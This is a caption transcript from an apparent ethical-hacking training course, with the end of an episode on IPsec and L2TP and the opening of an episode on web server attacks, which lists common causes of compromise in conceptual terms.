and\n\n493\n00:23:02.437 --> 00:23:06.577\na branch office that's doing IPsec, but\nI wanna add some integrity to the packets\n\n494\n00:23:06.577 --> 00:23:10.960\nthat are going from servers on one side\nto servers or clients on the other side.\n\n495\n00:23:10.960 --> 00:23:12.715\nI might add in On that traffic,\n\n496\n00:23:12.715 --> 00:23:16.560\nbut I don't need to do the ESP because\nI've already got a secure tunnel.\n\n497\n00:23:16.560 --> 00:23:19.506\nAnd maybe I'm not as worried about\nencrypting traffic on the LAN, so maybe\n\n498\n00:23:19.506 --> 00:23:22.855\njust adding the Gives me that integrity\nwithout the overhead of ahead of.\n\n499\n00:23:22.855 --> 00:23:23.565\n&gt;&gt; I like that, yeah.\n\n500\n00:23:23.565 --> 00:23:24.914\n&gt;&gt; Encrypting it again?\n\n501\n00:23:24.914 --> 00:23:26.090\n&gt;&gt; No, I like that, it's good, yeah.\n\n502\n00:23:26.090 --> 00:23:27.820\nIt's good, that's a good one.\n\n503\n00:23:27.820 --> 00:23:28.724\nOkay, you redeem yourself\non the color thing,\n\n504\n00:23:28.724 --> 00:23:29.547\nit was actually pretty good, I like that.\n\n505\n00:23:29.547 --> 00:23:32.857\n&gt;&gt; [LAUGH]\n&gt;&gt; But I'm watching.\n\n506\n00:23:32.857 --> 00:23:34.344\n&gt;&gt; Okay, I'm on my toes.\n\n507\n00:23:34.344 --> 00:23:36.205\n&gt;&gt; Stay sharp, is all I have to say.\n\n508\n00:23:36.205 --> 00:23:37.119\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, that was good,\n\n509\n00:23:37.119 --> 00:23:37.661\nI like that a lot.\n\n510\n00:23:37.661 --> 00:23:38.845\nIt was actually a good way\nto wrap that up I think.\n\n511\n00:23:38.845 --> 00:23:39.890\nAnd a good way to think about that.\n\n512\n00:23:39.890 --> 00:23:42.005\nSo one other thing quickly\njust to point out and\n\n513\n00:23:42.005 --> 00:23:44.619\nwe talked about this when we\nmentioned L2TP with IPsec.\n\n514\n00:23:44.619 --> 00:23:48.370\nSo keep in mind, and I always stress\nthis when we talk about this as well,\n\n515\n00:23:48.370 --> 00:23:50.540\nL2TP by itself is garbage.\n\n516\n00:23:50.540 --> 00:23:51.580\nIt is meaningless.\n\n517\n00:23:51.580 --> 00:23:55.130\nIf L2TP does not have IPsec\nit has no reason to exist.\n\n518\n00:23:55.130 --> 00:23:56.460\nRight?\nBecause L2TP,\n\n519\n00:23:56.460 --> 00:23:58.270\nall it does is create a tunnel.\n\n520\n00:23:58.270 --> 00:24:01.701\nBut a tunnel with no encryption is,\nreally, meaningless.\n\n521\n00:24:01.701 --> 00:24:03.157\n&gt;&gt; I mean, a glass tunnel maybe?\n\n522\n00:24:03.157 --> 00:24:05.060\nI don't know what you would do with that.\n\n523\n00:24:05.060 --> 00:24:05.935\n&gt;&gt; There's just no value.\n\n524\n00:24:05.935 --> 00:24:07.631\nAnd I mean, it's just essentially,\n\n525\n00:24:07.631 --> 00:24:10.890\nwhy am I bothering to put data through\na tunnel that has no encryption?\n\n526\n00:24:10.890 --> 00:24:12.430\nBecause the data's not protected.\n\n527\n00:24:12.430 --> 00:24:16.714\nPeople think you say the word tunnel,\nand somehow magically data is protected,\n\n528\n00:24:16.714 --> 00:24:20.374\na data tunnel with no encryption is\na data tunnel with no encryption.\n\n529\n00:24:20.374 --> 00:24:23.550\n&gt;&gt; [LAUGH]\n&gt;&gt; There is no change in that status.\n\n530\n00:24:23.550 --> 00:24:27.250\nMeaning without encryption,\nyou essentially have no protection.\n\n531\n00:24:27.250 --> 00:24:27.790\nRight?\n\n532\n00:24:27.790 --> 00:24:31.060\nAnd what we really is\na ton of in encryption.\n\n533\n00:24:31.060 --> 00:24:34.410\nAnd so L2TP, which is in and of itself\n\n534\n00:24:34.410 --> 00:24:38.660\nby itself not capable of doing encryption\nnatively, it does not support it.\n\n535\n00:24:38.660 --> 00:24:41.899\nWhich is why you never hear about\nsomebody just implementing L2TP.\n\n536\n00:24:41.899 --> 00:24:44.710\nYou heard about them\nimplementing L2TP with IPSEC.\n\n537\n00:24:44.710 --> 00:24:48.191\nSo and by the way if you ever hear of\nanybody implementing L2TP by itself,\n\n538\n00:24:48.191 --> 00:24:51.956\nmake sure you stop and take the time to\neducate them about the reasons why that's\n\n539\n00:24:51.956 --> 00:24:53.716\na really stupid thing to do, right.\n\n540\n00:24:53.716 --> 00:24:55.540\nBecause they shouldn't be doing that.\n\n541\n00:24:55.540 --> 00:24:58.120\nBut we always talk about L2TP with IP Sec.\n\n542\n00:24:58.120 --> 00:25:01.880\nSo as a result, we just remember that\nwhen we combine these two together,\n\n543\n00:25:01.880 --> 00:25:05.970\nthe power of the ability to be able to\ncombine them, the value there is that\n\n544\n00:25:05.970 --> 00:25:09.250\nwe're getting the encryption, and\nas Mike said, the authentication.\n\n545\n00:25:09.250 --> 00:25:11.360\nAssociated with the tunnel.\n\n546\n00:25:11.360 --> 00:25:14.890\nThen the tunnel becomes valuable\nas a resource to protect,\n\n547\n00:25:14.890 --> 00:25:18.940\ncreate confidentiality, authenticity\nintegrity and all the things that we talk\n\n548\n00:25:18.940 --> 00:25:21.900\nabout to safeguard our data as\nwe transit it back and forth.\n\n549\n00:25:21.900 --> 00:25:23.920\nSo that's the important part.\n\n550\n00:25:23.920 --> 00:25:28.184\n&gt;&gt; All right, Adam, great look there as\nwe round out our conversation on session\n\n551\n00:25:28.184 --> 00:25:30.329\nhijacking with some talk about IP Sec.\n\n552\n00:25:30.329 --> 00:25:33.478\nAnd the different modes and how we can\nuse IP Sec to really counteract, or\n\n553\n00:25:33.478 --> 00:25:36.945\nas a counter measure to some of those\nsession hijacking techniques that we saw.\n\n554\n00:25:36.945 --> 00:25:38.325\n&gt;&gt; Could we say counterbalance?\n\n555\n00:25:38.325 -->

00:00:17.111\nI'm your host, Mike Rodrick,\n\n4\n00:00:17.111 --> 00:00:20.152\nand today we're doing our certified\nethical hacker version 9.\n\n5\n00:00:20.152 --> 00:00:24.755\nAnd specifically in this episode we're\ngonna dive into the world of attacking and\n\n6\n00:00:24.755 --> 00:00:26.320\nhacking web servers.\n\n7\n00:00:26.320 --> 00:00:28.500\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n8\n00:00:28.500 --> 00:00:29.228\nHow are you doing, Adam?\n\n9\n00:00:29.228 --> 00:00:33.660\n&gt;&gt; I am diving in to attack and\nhack web servers.\n\n10\n00:00:33.660 --> 00:00:36.868\n&gt;&gt; [LAUGH]\n&gt;&gt; Long waves, very big.\n\n11\n00:00:36.868 --> 00:00:38.370\n&gt;&gt; Sounds like.\n&gt;&gt; Yes.\n\n12\n00:00:38.370 --> 00:00:39.500\n&gt;&gt; Three syllables.\n\n13\n00:00:39.500 --> 00:00:40.090\n&gt;&gt; Two.\n\n14\n00:00:40.090 --> 00:00:41.578\n&gt;&gt; Two syllables.\n&gt;&gt; Web servers.\n\n15\n00:00:41.578 --> 00:00:43.612\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so\n\n16\n00:00:43.612 --> 00:00:45.323\nwe're gonna talk a bit about web servers.\n\n17\n00:00:45.323 --> 00:00:50.303\nAnd this really starts a discussion\nthat will continue as a theme across\n\n18\n00:00:50.303 --> 00:00:52.635\nthe web applications episodes.\n\n19\n00:00:52.635 --> 00:00:55.375\nI encourage you to take a look\nat those if you haven't.\n\n20\n00:00:55.375 --> 00:00:59.095\nSQL injection discussions that\nhappen a little later on as well.\n\n21\n00:00:59.095 --> 00:01:03.312\nKind of a general theme in this block\nof knowledge about what happens out\n\n22\n00:01:03.312 --> 00:01:08.250\nin the great expanse of the World Wide\nWeb, and that's also a generational thing.\n\n23\n00:01:08.250 --> 00:01:10.320\nDo you call it the Internet or\ndo you call it the World Wide Web?\n\n24\n00:01:10.320 --> 00:01:11.760\n&gt;&gt; I call it the Internet now.\n\n25\n00:01:11.760 --> 00:01:12.260\n&gt;&gt; You do?\n&gt;&gt; Yeah.\n\n26\n00:01:12.260 --> 00:01:12.760\n&gt;&gt; Now.\n\n27\n00:01:12.760 --> 00:01:14.380\n&gt;&gt; But it used to be the World Wide Web,\n\n28\n00:01:14.380 --> 00:01:15.334\nyep, for sure.\n&gt;&gt; Well,\n\n29\n00:01:15.334 --> 00:01:16.424\nit actually used to be the Internet, and\n\n30\n00:01:16.424 --> 00:01:17.639\nthen it became the World Wide Web.\n&gt;&gt; Yeah,\n\n31\n00:01:17.639 --> 00:01:18.305\nright.\n&gt;&gt; The Internet was before\n\n32\n00:01:18.305 --> 00:01:20.229\nthe World Wide Web.\n&gt;&gt; No, then I still call it the Internet,\n\n33\n00:01:20.229 --> 00:01:23.055\nyeah.\n&gt;&gt; Cuz the Internet was the non-graphical,\n\n34\n00:01:23.055 --> 00:01:26.660\nnon-picture version of the World Wide Web\nwhich is what we have now.\n\n35\n00:01:26.660 --> 00:01:28.473\nSo I'm clearly talking\nto the wrong person.\n\n36\n00:01:28.473 --> 00:01:29.915\n&gt;&gt; [LAUGH]\n&gt;&gt; I should not be having this\n\n37\n00:01:29.915 --> 00:01:32.469\nconversation since you\nhave no point of reference\n\n38\n00:01:32.469 --> 00:01:33.105\nfor-\n&gt;&gt; Wait, what is today?\n\n39\n00:01:33.105 --> 00:01:34.250\n&gt;&gt; What I'm talking about.\n\n40\n00:01:34.250 --> 00:01:39.630\nToday is the day that we do all\nsorts of interesting things.\n\n41\n00:01:39.630 --> 00:01:42.430\nSo my point was just simply that.\n\n42\n00:01:42.430 --> 00:01:45.061\nI really actually had no point at all,\nso forget whatever I was gonna say,\n\n43\n00:01:45.061 --> 00:01:45.902\ntotally irrelevant.\n\n44\n00:01:45.902 --> 00:01:49.540\nI was just gonna make a comment on the\nfact that we talk about web servers today.\n\n45\n00:01:49.540 --> 00:01:52.150\nEverything is the web, web this, web that.\n\n46\n00:01:52.150 --> 00:01:54.960\nWe now see like things,\nlike the Internet of Things.\n\n47\n00:01:54.960 --> 00:01:57.803\nThe IOT is a big anti-cloud\nconversation point, so\n\n48\n00:01:57.803 --> 00:02:00.005\nit's the marketing piece around that.\n\n49\n00:02:00.005 --> 00:02:04.050\nBut just it's interesting because these\nterms get bantered around interchangeably.\n\n50\n00:02:04.050 --> 00:02:09.133\nInternet, World Wide Web, we don't really\nstop and think about what the genesis,\n\n51\n00:02:09.133 --> 00:02:13.170\nright, the history of some of these\nterms and the terminology is.\n\n52\n00:02:13.170 --> 00:02:16.330\nWe just use them and\nthey become common and very,\n\n53\n00:02:16.330 --> 00:02:21.140\nvery sometimes misrepresentative of\nthe idea that we're trying to put forth.\n\n54\n00:02:21.140 --> 00:02:23.070\nWhen I asked somebody\nrecently about Archie.\n\n55\n00:02:23.070 --> 00:02:25.550\nAnd I asked somebody\nrecently about Finger.\n\n56\n00:02:25.550 --> 00:02:27.250\nThat was an interesting conversation.\n\n57\n00:02:27.250 --> 00:02:32.200\nI'm talking about the older protocols,\nGopher, Archie, and\n\n58\n00:02:32.200 --> 00:02:36.040\nFinger that are still around and you can\ncertainly find out about them if you're\n\n59\n00:02:36.040 --> 00:02:38.740\nnot familiar with them,\nthat at various points were used.\n\n60\n00:02:38.740 --> 00:02:41.370\nWe used to use Finger, we still do,\nalthough most people don't use it,\n\n61\n00:02:41.370 --> 00:02:44.270\nto be able to reach out and\nsee what the last log on was on a system.\n\n62\n00:02:44.270 --> 00:02:47.340\nWe talk about putting the finger\non you and that whole thing.\n\n63\n00:02:47.340 --> 00:02:50.110\nBut people look at me like\nI'm from another planet,\n\n64\n00:02:50.110 --> 00:02:52.200\nlike what the hell are you talking about.\n\n65\n00:02:52.200 --> 00:02:53.132\nIs that a comic book thing?\n\n66\n00:02:53.132 --> 00:02:55.245\n&gt;&gt; [LAUGH]\n&gt;&gt; And yes, Archie is a comic book thing,\n\n67\n00:02:55.245 --> 00:02:56.795\nbut you're too young to know that.\n\n68\n00:02:56.795 --> 00:02:58.910\n&gt;&gt; [LAUGH]\n&gt;&gt; You don't know what it was used for, so\n\n69\n00:02:58.910 --> 00:03:01.380\nI'm not quite clear how\nall that comes together.\n\n70\n00:03:01.380 --> 00:03:06.480\nBut the concept of vocabulary in our\nworld and what we're talking about\n\n71\n00:03:06.480 --> 00:03:10.051\nin many of these episodes is so\ncritical, as we often stressed to you,\n\n72\n00:03:10.051 --> 00:03:14.140\nthe importance of understanding what a\nterm means, how to define it specifically.\n\n73\n00:03:14.140 --> 00:03:16.800\nAnd really bound it to, or bind it to, and\n\n74\n00:03:16.800 --> 00:03:21.906\nkinda put a boundary around the definition\nto understand the importance of it.\n\n75\n00:03:21.906 --> 00:03:23.393\nThese are the kind of things\nwe have to think about.\n\n76\n00:03:23.393 --> 00:03:26.657\nAnd so we talk about web servers, but the\nreality is a few years ago they would have\n\n77\n00:03:26.657 --> 00:03:29.400\nbeen Internet servers,\nwouldn't have been web servers.\n\n78\n00:03:29.400 --> 00:03:31.050\nAnd it's just an interesting dichotomy.\n\n79\n00:03:31.050 --> 00:03:31.620\n&gt;&gt; It is.\n\n80\n00:03:31.620 --> 00:03:33.012\n&gt;&gt; So just thought I'd mention that.\n\n81\n00:03:33.012 --> 00:03:34.490\nWe're good,\n\n82\n00:03:34.490 --> 00:03:37.655\nyou got coffee, can I have a sip while\nyou wanna make something up and talk?\n\n83\n00:03:37.655 --> 00:03:39.270\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm actually out of stuff,\n\n84\n00:03:39.270 --> 00:03:40.510\nthat was the only thing I had.\n\n85\n00:03:40.510 --> 00:03:43.152\n&gt;&gt; There's not a lot to say about web\nservers, I mean, there really isn't.\n\n86\n00:03:43.152 --> 00:03:45.940\nIf it was Internet servers there\nwould be a whole bunch to say, but\n\n87\n00:03:45.940 --> 00:03:48.700\nbecause it's web servers,\nI am at a loss as to what to do.\n\n88\n00:03:48.700 --> 00:03:50.730\nI don't know.\nWe could talk about spiderwebs.\n\n89\n00:03:50.730 --> 00:03:51.789\n&gt;&gt; Ooh, spiderwebs are good.\n\n90\n00:03:51.789 --> 00:03:52.523\n&gt;&gt; They're like snowflakes, by the way.\n\n91\n00:03:52.523 --> 00:03:53.523\n&gt;&gt; Have you ever watched\na spider make a web?\n\n92\n00:03:53.523 --> 00:03:56.250\n&gt;&gt; I have, and\nthey're as unique as snowflakes.\n\n93\n00:03:56.250 --> 00:03:58.755\nThey say that no two snowflakes are alike,\nand\n\n94\n00:03:58.755 --> 00:04:00.930\nspiderwebs are as unique as snowflakes.\n\n95\n00:04:00.930 --> 00:04:05.140\nSo we could come up with a biometric\nthought process that allows you to,\n\n96\n00:04:05.140 --> 00:04:07.770\nwe could call it spider something or\nother.\n\n97\n00:04:07.770 --> 00:04:08.720\n&gt;&gt; Spidercation, or?\n\n98\n00:04:08.720 --> 00:04:11.380\n&gt;&gt; I don't know, but\nit would allow you to identify based on\n\n99\n00:04:11.380 --> 00:04:14.510\nowning a spiderweb as opposed to\nanything else because it's so unique.\n\n100\n00:04:14.510 --> 00:04:17.900\nAnd if we paired it with a snowflake\nwe'd call it Snow Spider.\n\n101\n00:04:17.900 --> 00:04:18.740\n&gt;&gt; Ooh, that's good.\n\n102\n00:04:18.740 --> 00:04:19.530\n&gt;&gt; See, now that is cool.\n\n103\n00:04:19.530 --> 00:04:20.270\n&gt;&gt; That is good.\n\n104\n00:04:20.270 --> 00:04:24.780\n&gt;&gt; Snow Spider, and so\nwe could do Snow Spider authentication.\n\n105\n00:04:24.780 --> 00:04:28.670\nAnd if that was the case, you'd have\nto have a snowflake and a spiderweb.\n\n106\n00:04:28.670 --> 00:04:30.620\n&gt;&gt; Right.\n&gt;&gt; And then you would be the most cool,\n\n107\n00:04:30.620 --> 00:04:31.692\nunique person on the planet.\n\n108\n00:04:31.692 --> 00:04:35.570\n&gt;&gt; [LAUGH] A little chill box to\nkeep that flake nice and cold so\n\n109\n00:04:35.570 --> 00:04:36.360\nit wouldn't melt down.\n\n110\n00:04:36.360 --> 00:04:39.950\n&gt;&gt; That would, obviously there's some\nparticulars we'd have to work out.\n\n111\n00:04:39.950 --> 00:04:42.990\nWe have the devious engineering\ntalent here to do that.\n\n112\n00:04:42.990 --> 00:04:44.090\nNate could do that.\n\n113\n00:04:44.090 --> 00:04:44.656\n&gt;&gt; Nate could whip something up.\n\n114\n00:04:44.656 --> 00:04:47.840\n&gt;&gt; Five minutes, he's awesome.\n\n115\n00:04:47.840 --> 00:04:49.945\nHe could easily, him and Ronnie,\nthey could take over the world.\n\n116\n00:04:49.945 --> 00:04:50.940\n&gt;&gt; They're like MacGyver.\n\n117\n00:04:50.940 --> 00:04:52.670\n&gt;&gt; I was thinking more like Pinky and\nthe Brain.\n\n118\n00:04:52.670 --> 00:04:53.459\n&gt;&gt; Pinky and the Brain, there we go.\n\n119\n00:04:53.459 --> 00:04:54.413\n&gt;&gt; Yeah, there you go.\n\n120\n00:04:54.413 --> 00:04:56.674\n&gt;&gt; Have you watched Rick and\nMorty, by the way?\n\n121\n00:04:56.674 --> 00:04:58.291\n&gt;&gt; I have not, but\nthis weekend I'm gonna binge it.\n\n122\n00:04:58.291 --> 00:04:59.083\n&gt;&gt; You better.\n&gt;&gt; [CROSSTALK]\n\n123\n00:04:59.083 --> 00:05:00.200\n&gt;&gt; You've gotta watch Rick and Morty.\n\n124\n00:05:00.200 --> 00:05:02.950\nThat is just, yeah,\nyou've gotta watch Rick and Morty.\n\n125\n00:05:02.950 --> 00:05:05.550\nSo anyway, Snow Spider?\n\n126\n00:05:05.550 --> 00:05:06.330\n&gt;&gt; Where were we?\n\n127\n00:05:06.330 --> 00:05:07.940\n&gt;&gt; Yeah, Snow Spider,\nthat's where we were.\n\n128\n00:05:07.940 --> 00:05:11.780\nAll right, so now that we've totally\nrandomly asided for like five minutes of\n\n129\n00:05:11.780 --> 00:05:14.320\nnon sequiturs, let's actually get\nback to what we were talking about.\n\n130\n00:05:14.320 --> 00:05:16.490\nSo with regards to web servers, right.\n\n131\n00:05:16.490 --> 00:05:20.240\nWhen we think about web servers,\nwe think about systems often in a DMZ.\n\n132\n00:05:20.240 --> 00:05:23.106\nMore often than not, not always,\nbut a lot of the times in a DMZ.\n\n133\n00:05:23.106 --> 00:05:25.088\nAnd sitting in that semi-public,\n\n134\n00:05:25.088 --> 00:05:29.912\nsemi-private trusted space providing\nservices, information, data, a variety of\n\n135\n00:05:29.912 --> 00:05:34.269\nthings to both people that are known\nto us, authenticated users from inside,\n\n136\n00:05:34.269 --> 00:05:38.860\nperhaps strangers that we don't know\nfrom outside, a combination of those.\n\n137\n00:05:38.860 --> 00:05:41.290\nBut there are many things that\nweb servers are used for today.\n\n138\n00:05:41.290 --> 00:05:42.480\nWe take a lot of this for granted.\n\n139\n00:05:42.480 --> 00:05:45.120\nWe don't think about it, but\nif you go into a building,\n\n140\n00:05:45.120 --> 00:05:49.170\nlet's say hypothetically, that has\na automated registry that's computerized.\n\n141\n00:05:49.170 --> 00:05:51.940\nA lot of times it's gonna come through\na web server, it's being served up.\n\n142\n00:05:51.940 --> 00:05:56.256\nIf you have a remote access concept\ninto any kind of management interface,\n\n143\n00:05:56.256 --> 00:05:59.360\nyou're using a web-based\nAPI probably to do that.\n\n144\n00:05:59.360 --> 00:06:01.690\nThat's all gonna come from\nsome sort of web server.\n\n145\n00:06:01.690 --> 00:06:03.970\nIf you're doing anything\nwith your mobile device,\n\n146\n00:06:03.970 --> 00:06:07.500\nthat is gonna involve consuming data,\nright, from some feed or something.\n\n147\n00:06:07.500 --> 00:06:09.940\nThere's a web service of some kind\ninvolved with that traditionally.\n\n148\n00:06:09.940 --> 00:06:11.660\nSo we see a lot of that kind of stuff.\n\n149\n00:06:11.660 --> 00:06:13.690\n&gt;&gt; I think about a lot of\nthe little devices we buy like for\n\n150\n00:06:13.690 --> 00:06:17.660\na home network, little Linksys routers,\naccess points, things like that.\n\n151\n00:06:17.660 --> 00:06:19.130\nThey've got a web server built into them.\n\n152\n00:06:19.130 --> 00:06:23.180\nThere's toys now that you buy that have\nweb interfaces that you can deal with.\n\n153\n00:06:23.180 --> 00:06:25.360\n&gt;&gt; There's all sorts of stuff, yeah,\n\n154\n00:06:25.360 --> 00:06:28.870\nI mean, yeah, there's all sorts of stuff,\njust millions and millions of things.\n\n155\n00:06:28.870 --> 00:06:30.740\nAnd it really is kind of interesting.\n\n156\n00:06:30.740 --> 00:06:31.554\nA little scary at times too.\n\n157\n00:06:31.554 --> 00:06:32.070\n&gt;&gt; Yeah.\n\n158\n00:06:32.070 --> 00:06:34.970\n&gt;&gt; I mean, your cars today, more and more\ndepending on when you bought your car,\n\n159\n00:06:34.970 --> 00:06:39.300\nhow new it may be, are becoming just\nbasically mobile platforms literally.\n\n160\n00:06:39.300 --> 00:06:40.590\nThey're wireless enabled.\n\n161\n00:06:40.590 --> 00:06:42.007\nThey've got the ability to reach out and\n\n162\n00:06:42.007 --> 00:06:44.225\ndo updates over the web depending\non who we're talking about.\n\n163\n00:06:44.225 --> 00:06:45.540\nYou know Tesla-\n&gt;&gt; Mm-hm.\n\n164\n00:06:45.540 --> 00:06:49.467\n&gt;&gt; Has committed to doing the whole\nfirmware revision thing wirelessly and\n\n165\n00:06:49.467 --> 00:06:51.409\npushing updates to their systems.\n\n166\n00:06:51.409 --> 00:06:55.051\nAnd it's just an interesting\nworld we live in.\n\n167\n00:06:55.051 --> 00:06:56.768\nThere's a lot that could be\nsaid that's good about it.\n\n168\n00:06:56.768 --> 00:06:58.033\nThere's a lot that may not be so\n\n169\n00:06:58.033 --> 00:07:00.520\ngood about it as we're gonna\ntalk about here shortly.\n\n170\n00:07:00.520 --> 00:07:04.188\nAnybody who's flying right now while\nwatching this, by the way, wow,\n\n171\n00:07:04.188 --> 00:07:05.462\nyou are just like [SOUND].\n\n172\n00:07:05.462 --> 00:07:06.780\n&gt;&gt; That is pretty impressive.\n\n173\n00:07:06.780 --> 00:07:10.406\n&gt;&gt; That is, no, no, no, I mean just\nthe liabilities associated with being\n\n174\n00:07:10.406 --> 00:07:12.638\non a plane and wireless and\nweb and avionics.\n\n175\n00:07:12.638 --> 00:07:17.130\nAnd I just, I wish you luck is all I have\nto say because hopefully the journey ends\n\n176\n00:07:17.130 --> 00:07:18.820\nwell and everything is safe.\n\n177\n00:07:18.820 --> 00:07:20.810\nWe do want you to be safe at all times,\nbut\n\n178\n00:07:20.810 --> 00:07:24.450\nyou are a gambling person when\nyou jump on an airplane today.\n\n179\n00:07:24.450 --> 00:07:27.547\nAnd I don't wanna make that sound like\nair travel is bad, it's not safe.\n\n180\n00:07:27.547 --> 00:07:31.560\nQuite the opposite, don't want that to\neven be a rumor, let alone an innuendo.\n\n181\n00:07:31.560 --> 00:07:35.662\nBut what I'm pointing out simply is\nthe following, these planes today and\n\n182\n00:07:35.662 --> 00:07:40.218\nthis is the same thing with cars as we're\njust talking about a minute ago, planes,\n\n183\n00:07:40.218 --> 00:07:42.780\nand this is a well known issue for\na little bit.\n\n184\n00:07:42.780 --> 00:07:45.660\nIt's been resolved, thankfully,\nslowly but surely now.\n\n185\n00:07:45.660 --> 00:07:46.844\nBut at a certain point,\n\n186\n00:07:46.844 --> 00:07:50.102\nwhen they first started using\nGogo wireless Internet, Wi-Fi,\n\n187\n00:07:50.102 --> 00:07:53.969\nwhatever they call it, Gogo Inflight or\nwhatever the wireless provider is.\n\n188\n00:07:53.969 --> 00:07:57.827\nThere were problems on a lot of these\nplanes, because the network that they\n\n189\n00:07:57.827 --> 00:08:02.297\nwould setup in the plane to let you have\nwireless so that as you're 50,000 feet up\n\n190\n00:08:02.297 --> 00:08:06.116\nflying around or whatever you're doing\nYou can check your email is good.\n\n191\n00:08:06.116 --> 00:08:06.997\nI mean that's fine.\n\n192\n00:08:06.997 --> 00:08:10.068\nBut the problem is that the Onyx\nnetwork in the plane was also connected\n\n193\n00:08:10.068 --> 00:08:11.310\nto the same system.\n\n194\n00:08:11.310 --> 00:08:14.220\nAnd there was really no protection\nthat separated the two that was\n\n195\n00:08:14.220 --> 00:08:15.540\nin any way meaningful.\n\n196\n00:08:15.540 --> 00:08:20.000\nAnd there were essentially studies done.\n\n197\n00:08:20.000 --> 00:08:22.560\nAnd then there were potential\nhacks that were looked at that\n\n198\n00:08:22.560 --> 00:08:25.330\ncould have easily have crossed over\nbetween the wireless network and\n\n199\n00:08:25.330 --> 00:08:27.768\nthe avionics network\nuntil this was resolved.\n\n200\n00:08:27.768 --> 00:08:29.120\nNothing ever happened thankfully and\n\n201\n00:08:29.120 --> 00:08:32.200\nthis was not an issue that\nled to any compromise.\n\n202\n00:08:32.200 --> 00:08:34.935\nLet me clear, don't wanna start\nany rumors, nothing like that.\n\n203\n00:08:34.935 --> 00:08:38.275\nThis was not a hack in any way that\nwas perpetrated as far as we know\n\n204\n00:08:38.275 --> 00:08:41.205\nthat led to any problems on\nan airplane anywhere in the world.\n\n205\n00:08:41.205 --> 00:08:44.265\nBut I'm just pointing out\nthe complexity of systems today and\n\n206\n00:08:44.265 --> 00:08:46.775\nthe fact that we connect\neverything together.\n\n207\n00:08:46.775 --> 00:08:49.605\nAnd the fact that sometimes,\nwe have unintended consequences,\n\n208\n00:08:49.605 --> 00:08:52.785\na lot of the times we have unintended\nconsequences, is something to consider.\n\n209\n00:08:52.785 --> 00:08:56.390\nBecause when we look at why web servers\nare compromised, improper file and\n\n210\n00:08:56.390 --> 00:08:58.140\ndirectory permissions.\n\n211\n00:08:58.140 --> 00:09:00.730\nInstalling systems with default settings,\nright.\n\n212\n00:09:00.730 --> 00:09:02.900\nUnnecessary services that are enabled.\n\n213\n00:09:02.900 --> 00:09:05.280\nSo you're running a bunch of\nstuff that doesn't belong there.\n\n214\n00:09:05.280 --> 00:09:07.710\nBad configuration or misconfiguration.\n\n215\n00:09:07.710 --> 00:09:10.520\nA lack of proper policies and oversight.\n\n216\n00:09:10.520 --> 00:09:13.710\nSecurity conflicts,\nbecause you're trying to do one thing,\n\n217\n00:09:13.710 --> 00:09:14.860\nbusiness wants to do another.\n\n218\n00:09:14.860 --> 00:09:17.000\nAnd clearly we have a mismatch there.\n\n219\n00:09:17.000 --> 00:09:19.270\nA lack of proper authentication.\n\n220\n00:09:19.270 --> 00:09:22.749\nDefault accounts with either no\npasswords or default settings.\n\n221\n00:09:24.560 --> 00:09:25.380\nMisconfiguration.\n\n222\n00:09:25.380 --> 00:09:28.250\nWe've talked about bugs in the underlying\narchitecture and software.\n\n223\n00:09:28.250 --> 00:09:31.190\nMisconfigured SSL certificates,\nself-signed\n\n224\n00:09:31.190 --> 00:09:35.580\ncertificates being used as opposed to\nproperly trusted third-party certificates.\n\n225\n00:09:35.580 --> 00:09:38.620\nAny and all of these things\nare problems in web servers today.\n\n226\n00:09:38.620 --> 00:09:43.180\nAnd this propagates out and just ripples\nout to all the other systems we touch.\n\n227\n00:09:43.180 --> 00:09:47.930\nBecause we web enable, ip enable,\nand expose so much today,\n\n228\n00:09:47.930 --> 00:09:52.450\nit's not even the systems that are\nindirectly connected that are the problem.\n\n229\n00:09:52.450 --> 00:09:56.830\nIt's the front end systems that\nif we allow that misbehavior and\n\n230\n00:09:56.830 --> 00:10:00.200\nthat bad action to occur can then be\nused to compromise everything else.\n\n231\n00:10:00.200 --> 00:10:03.610\nIn the wireless hacking,\nwireless conversations in those episodes.\n\n232\n00:10:03.610 --> 00:10:06.060\nAgain, encourage you to go back,\ntake a look there.\n\n233\n00:10:06.060 --> 00:10:09.920\nWhen we thought about and we talked\nabout the fact that with mobile and\n\n234\n00:10:09.920 --> 00:10:10.730\nwith wireless both.\n\n235\n00:10:10.730 --> 00:10:15.192\nI made this point in both in the hacking\nmobile and hacking wireless discussions.\n\n236\n00:10:15.192 --> 00:10:17.360\nKinda cross pollinating the two and\n\n237\n00:10:17.360 --> 00:10:19.760\nlinking them to cryptography and\nsome of the other stuff we did.\n\n238\n00:10:19.760 --> 00:10:22.440\nBut in the hacking mobile\nepisodes in particular,\n\n239\n00:10:22.440 --> 00:10:25.910\nI made reference to the fact that mobile\ndevices today are two way radios.\n\n240\n00:10:25.910 --> 00:10:29.450\nAt least smartphones anyway are two\nway radios that also have wireless\n\n241\n00:10:29.450 --> 00:10:30.000\ncapabilities.\n\n242\n00:10:30.000 --> 00:10:32.550\nSo when we hook them up\nto a wireless network\n\n243\n00:10:32.550 --> 00:10:34.084\nwe have to be very careful about that.\n\n244\n00:10:34.084 --> 00:10:37.600\nAnd I made that point in\nthe Hacking Wireless Episode that\n\n245\n00:10:37.600 --> 00:10:40.960\na lot of the times it's not always\nthe wireless network that is the problem.\n\n246\n00:10:40.960 --> 00:10:43.750\nBut because it's tethered\nto the wired world, right?\n\n247\n00:10:43.750 --> 00:10:48.810\nAnd if we configure the wireless\nspace to be very secure, but\n\n248\n00:10:48.810 --> 00:10:50.840\nthe stuff behind it is not.\n\n249\n00:10:50.840 --> 00:10:55.200\nWe may backflow out of the wired network\ninto the wireless network and blow it up.\n\n250\n00:10:55.200 --> 00:10:57.880\nAnd it's the same thing if we're coming\nin on on an unsecured channel in\n\n251\n00:10:57.880 --> 00:10:58.880\nthe wireless world.\n\n252\n00:10:58.880 --> 00:11:01.470\nBut we're heavily defended at\nthe border on the wired side.\n\n253\n00:11:01.470 --> 00:11:04.240\nWe could blow up one because\nwe're not careful in both.\n\n254\n00:11:04.240 --> 00:11:07.900\nAnd so we really have to think about\nthis concept as we start to talk\n\n255\n00:11:07.900 --> 00:11:09.748\nabout web servers and what we're doing.\n\n256\n00:11:09.748 --> 00:11:14.170\nThe impact of web server attacks,\nobviously compromise of user accounts,\n\n257\n00:11:14.170 --> 00:11:15.490\ndefacement of the website.\n\n258\n00:11:15.490 --> 00:11:17.600\nWhich may or may not be a big deal,\nyou could fix 